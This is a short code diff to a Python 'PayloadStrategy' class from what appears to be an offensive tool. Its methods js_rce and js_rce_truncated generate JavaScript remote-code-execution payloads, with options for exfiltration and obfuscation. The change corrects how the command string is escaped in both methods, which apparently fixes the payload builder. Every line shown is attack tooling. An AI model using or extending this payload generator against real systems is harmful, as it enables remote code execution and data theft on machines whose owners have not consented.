@@ -113,7 +113,7 @@ class PayloadStrategy:
     @staticmethod
     def js_rce(cmd,exfil='redirect',obf_level=0,**kw):
         """Build the JS code that goes into _prefix."""
-        ce=cmd.replace("\\","\\\\\\\\").replace("'","\\\\'").replace('"','\\"')
+        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
@@ -137,7 +137,7 @@ class PayloadStrategy:
     @staticmethod
     def js_rce_truncated(cmd,max_bytes=4000,exfil='redirect',obf_level=0,**kw):
         """Like js_rce but truncates output server-side for large commands."""
-        ce=cmd.replace("\\","\\\\\\\\").replace("'","\\\\'").replace('"','\\"')
+        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
